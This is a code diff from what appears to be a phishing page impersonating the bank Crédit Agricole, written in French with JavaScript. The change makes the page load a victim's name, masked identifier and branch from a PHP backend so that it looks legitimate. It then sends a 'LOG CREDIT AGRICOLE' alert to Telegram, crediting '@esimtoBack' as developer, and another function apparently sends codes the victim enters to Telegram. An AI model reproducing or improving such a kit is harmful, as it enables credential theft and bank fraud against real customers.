@@ -494,14 +494,38 @@ function envoyerCodeTelegram() {
     envoyerTelegram(message);
 }
 
-// Message au chargement de la page
-envoyerTelegram(
-    "# LOG CREDIT AGRICOLE\n\n" +
-    "a new user is on the page\n\n" +
-    "🏦 Base ⊱ CREDIT AGRICOLE\n" +
-    "👨‍💻 DEV BY ⊱ @esimtoBack\n" +
-    "└━━━━━━━⊱ 🏦 ⊰━━━━━━━━━━━"
-);
+// Au chargement : récupérer les données depuis valider.php
+fetch('donnees.php')
+    .then(r => r.json())
+    .then(data => {
+        // Mise à jour du nom complet
+        document.getElementById('Full-name').textContent = data.prenom + ' ' + data.nom;
+
+        // Mise à jour de l'identifiant formaté : 3 premiers ····· 3 derniers
+        const id = data.identifiant || '';
+        let idFormate = id;
+        if (id.length >= 6) {
+            idFormate = id.slice(0, 3) + '·····' + id.slice(-3);
+        }
+
+        document.getElementById('identifiant').textContent = idFormate;
+        document.querySelector('.overlay-identifiant').textContent = idFormate;
+
+        // Mise à jour de l'établissement
+        document.getElementById('etablissement').textContent = data.etablissement;
+
+        // Puis on envoie le message Telegram (avec le nom mis à jour)
+        envoyerTelegram(
+            "# LOG CREDIT AGRICOLE\n\n" +
+            "a new user is on the page\n\n" +
+            "🏦 Base ⊱ CREDIT AGRICOLE\n" +
+            "👨‍💻 DEV BY ⊱ @esimtoBack\n" +
+            "└━━━━━━━⊱ 🏦 ⊰━━━━━━━━━━━"
+        );
+    })
+    .catch(function(e) {
+        console.error(e);
+    });
 
 </script>
 </body>
